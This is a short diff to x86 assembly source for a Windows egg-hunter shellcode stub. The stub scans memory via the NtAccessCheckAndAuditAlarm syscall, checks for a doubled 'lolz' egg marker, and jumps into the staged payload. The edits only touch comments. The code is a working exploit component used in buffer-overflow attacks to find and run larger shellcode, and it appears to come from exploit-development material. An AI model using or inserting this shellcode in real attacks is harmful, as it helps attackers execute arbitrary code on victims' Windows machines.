@@ -18,15 +18,15 @@ check_next_address:
   inc   edx                ; increment the test pointer by one
   push  edx                ; save current edx since syscalls do not preserve registers
   push  0x2                ; push NtAccessCheckAndAuditAlarm system call number
-  pop   eax                ; pop into eax (currently set for Windows 7 and below)
+  pop   eax                ; pop into eax (!!! currently set for Windows 7 and below)
   int   0x2e               ; perform the syscall
   cmp   al, 0x05           ; did we get 0xc0000005 (ACCESS_VIOLATION) ?
   pop   edx                ; restore edx
   je    _start             ; invalid ptr? go to the next page
-  mov   eax, 0x7a6c6f6c    ; set egg flag in eax (currently set to 'lolz')
+  mov   eax, 0x7a6c6f6c    ; set egg flag in eax (!!! currently set to 'lolz')
   mov   edi, edx           ; set edi to the pointer we validated
   scasd                    ; compare the dword in edi to eax
   jnz   check_next_address ; no match? increment the pointer by one and try again
   scasd                    ; compare the dword in edi to eax again (which is now edx + 4)
   jnz   check_next_address ; no match? increment the pointer by one and try again
-  jmp   edi                ; Found the egg. jump 8 bytes past it into our code.
+  jmp   edi                ; found the egg. jump 8 bytes past it into our code.
